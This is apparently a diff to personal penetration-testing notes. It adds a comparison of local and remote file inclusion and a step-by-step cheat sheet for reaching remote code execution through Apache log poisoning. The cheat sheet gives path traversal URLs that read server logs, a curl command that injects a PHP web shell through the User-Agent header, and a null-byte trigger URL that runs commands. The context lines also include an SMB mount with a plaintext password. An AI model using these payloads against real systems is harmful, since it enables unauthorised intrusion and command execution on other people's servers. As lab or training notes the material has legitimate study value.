@@ -90,3 +90,34 @@ smbclient -L //<host> -U <user>
 mount -t cifs //server/share /mnt \
   -o username=dora,password=Secret123
 ```
+
+--------------------------------------------------------------
+
+# LFI vs RFI
+## LFI
+    You can read arbitrary files (e.g. /etc/passwd).
+    You may escalate to RCE by poisoning logs (e.g. access your PHP code into access.log and then include it).
+    No direct outbound HTTP fetch is needed—everything is local.
+
+## RFI
+    The app fetches PHP code from your server and executes it immediately.
+    You get straight up remote shell or backdoor.
+    Modern PHP ships with allow_url_include=Off to block this by default.
+
+
+# LFI → Log Poisoning → RCE Cheat Sheet
+
+1. **Identify log file path**  
+  Look at the config file before 
+   ```bash
+   # Try common Apache log locations via LFI
+   http://TARGET/?something=../../../../../../var/log/apache2/access.log
+   http://TARGET/?something=../../../../../../var/log/httpd/access_log
+   ```
+2. **Inject php code**
+  ```bash 
+  curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
+  ```
+3. **Trigger LFI to include the poisoned log**
+http://TARGET/image.php?img=../../../../../../var/log/apache2/access.log%00&cmd=id
+
